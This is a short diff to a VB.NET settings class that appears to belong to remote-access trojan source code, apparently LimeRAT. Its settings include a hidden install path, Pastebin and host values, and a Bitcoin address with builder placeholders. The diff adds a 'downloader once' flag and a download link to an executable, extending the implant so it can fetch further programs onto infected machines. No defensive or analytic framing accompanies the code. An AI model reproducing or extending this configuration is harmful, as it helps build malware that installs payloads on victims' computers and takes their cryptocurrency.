@@ -22,6 +22,8 @@
     Public Shared PATH2 As String = "Lime" 'Sub Folder
     Public Shared fullpath = Environ(PATH1) & PATH2 & "\" & EXE
     Public Shared BTC_ADDR As String = "THIS IS YOUR BTC 1234567890" 'Bitcoin address
+    Public Shared DWN_CHK As Boolean = True 'downloader once
+    Public Shared DWN_LINK As String = "http://mirror2.internetdownloadmanager.com/idman630build8.exe" 'downloader link
 #Else
     Public Shared Pastebin As String = "%Pastebin%"
     Public Shared HOST As String
@@ -42,6 +44,8 @@
     Public Shared PATH2 As String = "%PATH2%"
     Public Shared fullpath = Environ(PATH1) & PATH2 & "\" & EXE
     Public Shared BTC_ADDR As String = "%BTC_ADDR%"
+    Public Shared DWN_CHK As Boolean = "%DWN_CHK%"
+    Public Shared DWN_LINK As String = "%DWN_LINK%"
 #End If
 
 End Class
